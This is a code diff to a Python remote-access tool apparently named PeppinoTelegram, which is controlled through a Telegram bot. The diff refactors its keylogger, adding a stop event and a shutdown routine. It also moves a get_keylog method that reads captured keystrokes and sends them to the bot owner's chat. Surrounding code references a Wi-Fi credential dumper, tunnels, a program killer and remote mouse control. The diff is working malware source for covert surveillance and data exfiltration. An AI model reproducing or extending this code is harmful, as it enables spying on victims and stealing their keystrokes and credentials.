@@ -499,6 +499,7 @@ class PeppinoTelegram:
             log_file=randomname(),
             encryptor=keyloggers_fernet
         )
+        self.keylogger_stop_event = Event()
 
         self.wifidumper = WifiDumper()
         self.all_session_messages: list[int] = []
@@ -1384,7 +1385,19 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 file = craft_file(logs, fname)
                 self.bot.sendDocument(self.owner_id, file)
         except Exception as e:
-            self.bsend(f"Exception while sending logs: \n{e}")
+            self.bsendWithHtml(f"<pre>Exception while sending logs: \n{e}</pre>")
+
+    def get_keylog(self) -> None:
+        self.keylogger.save_to_file()
+        keylog = self.keylogger.read_from_file()
+        fi = craft_file(
+            content=keylog.encode() if keylog else b"",
+            filename=f"keylog-{now()}.keylogger.log"
+        )
+        try:
+            self.bot.sendDocument(self.owner_id, fi)
+        except Exception as e:
+            self.bsendWithHtml(f"<pre>Exception while sending keylogs: \n{e}</pre>")
 
     def get_disk_info(self):
         print("Getting disk info")
@@ -1428,18 +1441,6 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def jumpscarenoaudio(self) -> None:
         print("Triggering jumpscare without audio")
         self.jumpscare(playaudio=False)
-
-    def get_keylog(self) -> None:
-        self.keylogger.save_to_file()
-        keylog = self.keylogger.read_from_file()
-        fi = craft_file(
-            content=keylog.encode() if keylog else b"",
-            filename=f"keylog-{now()}.keylogger.log"
-        )
-        try:
-            self.bot.sendDocument(self.owner_id, fi)
-        except Exception as e:
-            self.bsend(f"Exception while sending keylogs: \n{e}")
 
     def leftclick(self) -> None:
         print("Left mouse click")
@@ -2252,8 +2253,7 @@ The bot is now restarting. Please wait a moment...
 
 <i>⏱️ This may take a few seconds</i>""" if not custom_message else custom_message)
         if doit:
-            self.get_logs()
-            self.get_keylog()
+            self._stop()
             restart()
 
     def randomkeyboard(self, timeout: int =5) -> None:
@@ -3001,7 +3001,7 @@ The bot is now restarting. Please wait a moment...
         self.cantopenthread.start()
         STARTING_LOG_MESSAGE.edit("💀 PROGRAM KILLER STARTED")
 
-        self.keylogger_thread = Thread(target=self.keylogger.start, args=(Event(), ))#TODO: replace event with a real binded event and set a better filename and add encryption
+        self.keylogger_thread = Thread(target=self.keylogger.start, args=(self.keylogger_stop_event, ))#TODO: replace event with a real binded event and set a better filename and add encryption
         self.keylogger_thread.start()
         STARTING_LOG_MESSAGE.edit("⌨️ KEYLOGGER STARTED")
 
@@ -3078,6 +3078,16 @@ The bot is now restarting. Please wait a moment...
                 self.bsend("🛑 Interrupted by host machine, bye bye.")
                 self.running = False
 
+    def _stop(self) -> None:
+        self.running = False
+        self.clear()
+        self.bsend("🛑 Interrupted by you, bye bye.")
+        self.stop_all_tunnels()
+        self.keylogger_stop_event.set()
+        reset_mouse_controller_and_visibility()
+        self.get_keylog()
+        self.get_logs()
+
     def stop(self, confirm=True) -> None:
         print("Stopping bot")
         if confirm:
@@ -3085,13 +3095,7 @@ The bot is now restarting. Please wait a moment...
         else:
             stop = True
         if stop:
-            self.running = False
-            self.clear()
-            self.bsend("🛑 Interrupted by you, bye bye.")
-            self.stop_all_tunnels()
-            reset_mouse_controller_and_visibility()
-            self.get_keylog()
-            self.get_logs()
+            self._stop()
             sys.exit()
         else:
             self.operation_canceled()
